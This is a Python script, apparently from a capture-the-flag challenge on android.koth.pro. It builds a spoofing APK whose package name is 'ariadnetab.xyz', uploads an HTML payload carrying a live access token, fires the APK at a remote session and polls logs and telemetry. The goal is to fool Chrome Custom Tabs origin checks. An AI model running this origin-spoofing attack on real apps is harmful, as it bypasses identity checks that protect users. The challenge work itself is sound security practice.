#!/usr/bin/env python3
"""
One android.koth.pro shot with the origin-spoof APK. Same pipeline as shot.py
but builds solve/spoof, whose application id is literally `ariadnetab.xyz`.

One question: what does Chrome put in `MessageEvent.origin` for a Custom Tabs
channel opened by an app that fails Digital Asset Links? native-channel.js only
accepts a port when that string is `android-app://ariadnetab.xyz`, so if the
unverified fallback is `android-app://<packageName>` the package name is the key
to the challenge.
"""

import json
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import ari  # noqa: E402
import docs  # noqa: E402
import shot  # noqa: E402

APK = os.path.join(HERE, "spoof.apk")
PAYLOAD_JAVA = os.path.join(HERE, "spoof", "src", "ariadnetab", "xyz", "Payload.java")

# One throwaway id so the page's lane machinery has something to chew on without
# spending the run on a uuid hunt that the ledger has already ruled unusable.
TARGETS = ["11111111-1111-4111-8111-111111111111"]
LANES = 1
DEADLINE_MS = 12000


def build(tag):
    state = ari.load_state()
    state["access_token"] = ari.get_token(state["email"], state["password"])["access_token"]
    ari.save_state(state)

    with open(os.path.join(HERE, "payload.html")) as handle:
        html = handle.read()
    html = (html
            .replace("@@TOKEN@@", state["access_token"])
            .replace("@@TAG@@", tag)
            .replace("@@TARGETS@@", json.dumps(TARGETS))
            .replace("@@LANES@@", str(LANES))
            .replace("@@DEADLINE@@", str(DEADLINE_MS)))
    for marker in ("@@TOKEN@@", "@@TAG@@", "@@TARGETS@@", "@@LANES@@", "@@DEADLINE@@"):
        if marker in html:
            raise SystemExit("payload.html still contains %s" % marker)

    summary, _ = docs.upload(state, "spoof-%s.html" % tag, "text/html", html.encode())
    url = docs.viewer_url(state, summary["id"])
    state.update(payload_id=summary["id"], payload_url=url, tag=tag)
    ari.save_state(state)

    with open(PAYLOAD_JAVA, "w") as handle:
        handle.write(
            "package ariadnetab.xyz;\n\n"
            "/** Generated by spoofshot.py; the capability inside expires in 60 minutes. */\n"
            "public final class Payload {\n"
            "    public static final String URL = %s;\n"
            "    private Payload() {}\n}\n" % shot.java_string(url)
        )

    subprocess.run(
        [os.path.join(HERE, "build.sh"), os.path.join(HERE, "spoof")],
        check=True,
        cwd=HERE,
    )
    print("tag=%s payload=%s" % (tag, summary["id"]))
    return state


def fire(tag):
    shot.APK = APK
    state = build(tag)
    token = state["access_token"]
    session = shot.provision_with_retry()
    print("session", session, flush=True)

    seen = set()
    page_seen = set()
    deadline = time.time() + 420
    last_poll = 0.0
    while time.time() < deadline:
        _code, payload = shot.androidkoth.call("/session/%s/logs" % session)
        for line in reversed(payload.get("logs", []) if isinstance(payload, dict) else []):
            if line not in seen:
                seen.add(line)
                print(line, flush=True)
        if any("Runtime limit" in line or "spoof start" in line or "Run " in line
               for line in seen) and time.time() - last_poll > 5:
            last_poll = time.time()
            shot.poll_telemetry(tag, token, page_seen)
        if any("Runtime limit reached" in line or "Run failed" in line for line in seen):
            break
        time.sleep(4)
    time.sleep(6)
    shot.poll_telemetry(tag, token, page_seen)
    return session


if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 else "build"
    label = sys.argv[2] if len(sys.argv) > 2 else "p%d" % (int(time.time()) % 10000)
    if action == "build":
        build(label)
    elif action == "fire":
        fire(label)
        print("--- page telemetry ---")
        shot.read(label)
    elif action == "read":
        shot.read(label)
    else:
        raise SystemExit(__doc__)
